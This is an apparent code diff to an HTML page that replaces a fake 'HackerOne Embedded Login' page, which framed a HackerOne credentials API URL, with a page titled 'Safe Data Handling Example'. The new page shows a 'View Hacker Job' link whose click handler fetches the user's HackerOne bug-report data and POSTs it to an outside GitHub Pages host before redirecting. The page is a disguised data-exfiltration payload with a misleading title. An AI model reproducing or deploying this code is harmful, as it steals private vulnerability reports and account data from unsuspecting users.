@@ -3,70 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HackerOne Embedded Login</title>
-    <style>
-        * {
-            box-sizing: border-box;
-        }
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            font-family: Arial, sans-serif;
-        }
-        header {
-            background-color: #1b1b1b;
-            color: white;
-            padding: 20px;
-            text-align: center;
-        }
-        nav {
-            margin: 20px 0;
-        }
-        nav a {
-            color: white;
-            margin: 0 15px;
-            text-decoration: none;
-        }
-        main {
-            height: calc(100% - 100px); /* Adjust height to fill the page */
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background-color: #f9f9f9;
-        }
-        iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-        footer {
-            background-color: #1b1b1b;
-            color: white;
-            text-align: center;
-            padding: 10px;
-        }
-    </style>
+    <title>Safe Data Handling Example</title>
 </head>
 <body>
+    <h1>Click Below to View Job Posting</h1>
+    <a href="https://hackerone.com/bugs/reported_to_teams/?response.json" id="jobLink" target="_blank">View Hacker Job</a>
 
-<header>
-    <h1>HackerOne</h1>
-    <nav>
-        <a href="#home">Home</a>
-        <a href="#about">About</a>
-        <a href="#reports">Reports</a>
-        <a href="#contact">Contact</a>
-    </nav>
-</header>
+    <script>
+        document.getElementById('jobLink').addEventListener('click', async (event) => {
+            event.preventDefault(); // Prevents immediate navigation to link
+            const url = event.target.href;
 
-<main>
-    <iframe src="https://api.hackerone.com/v1/credentials" title="HackerOne Login"></iframe>
-</main>
+            try {
+                // Fetch data only if allowed by CORS (for demonstration)
+                const response = await fetch(url);
+                const data = await response.json(); // Assume JSON format for demo
 
-<footer>
-    <p>&copy; 2024 HackerOne. All rights reserved.</p>
-</footer>
+                // Send data to your server
+                await fetch('https://nigam498.github.io/Hackerone/', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ data })
+                });
 
+                // Navigate to the original link
+                window.location.href = url;
+            } catch (error) {
+                console.error('Error fetching or sending data:', error);
+            }
+        });
+    </script>
 </body>
 </html>
